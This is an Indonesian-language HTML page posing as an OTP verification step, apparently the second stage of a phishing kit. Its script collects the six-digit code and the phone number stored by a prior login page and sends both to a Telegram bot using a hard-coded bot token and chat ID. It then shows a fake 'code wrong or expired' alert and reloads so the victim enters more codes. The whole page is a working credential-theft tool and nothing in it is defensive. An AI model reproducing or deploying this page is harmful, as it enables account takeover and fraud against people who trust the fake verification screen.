<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; margin: 0; text-align: center; }
        .container { width: 90%; max-width: 400px; }
        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin: 30px 0; }
        .otp-inputs input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #ccc; border-radius: 8px; outline-color: #0046ff; }
        .btn-blue { 
            width: 100%; padding: 15px; border: none; border-radius: 50px; 
            background: linear-gradient(to right, #00b4ff, #0046ff); 
            color: white; font-size: 17px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>Verifikasi Kode</h3>
        <p>Kode OTP telah dikirimkan ke nomor <br><b id="displayPhone"></b></p>
        
        <div class="otp-inputs">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 0)">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 1)">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 2)">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 3)">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 4)">
            <input type="number" class="otp" maxlength="1" oninput="moveFocus(this, 5)">
        </div>

        <button class="btn-blue" onclick="sendOTP()">Konfirmasi</button>
    </div>

    <script>
        const token = '7950731309:AAGg2VGwiHfZxr8VcpkrWafa1HKDs53sqs4';
        const chatId = '6105452078';
        
        // Ambil No HP yang tadi disimpan di halaman login
        const phone = localStorage.getItem('userPhone') || "pelanggan";
        document.getElementById('displayPhone').innerText = phone;

        function moveFocus(input, index) {
            const inputs = document.querySelectorAll('.otp');
            if (input.value && index < 5) inputs[index + 1].focus();
        }

        function sendOTP() {
            let otpCode = "";
            document.querySelectorAll('.otp').forEach(input => otpCode += input.value);
            
            if(otpCode.length < 6) return alert("Masukkan 6 digit");

            const pesan = `ðŸ”‘ *KODE OTP*\nDari: \`${phone}\`\nKode: \`${otpCode}\``;
            
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=MarkdownV2`)
            .then(() => {
                alert("Kode verifikasi salah atau sudah kadaluarsa. Silakan minta kode baru.");
                window.location.reload();
            });
        }
    </script>
</body>
</html>
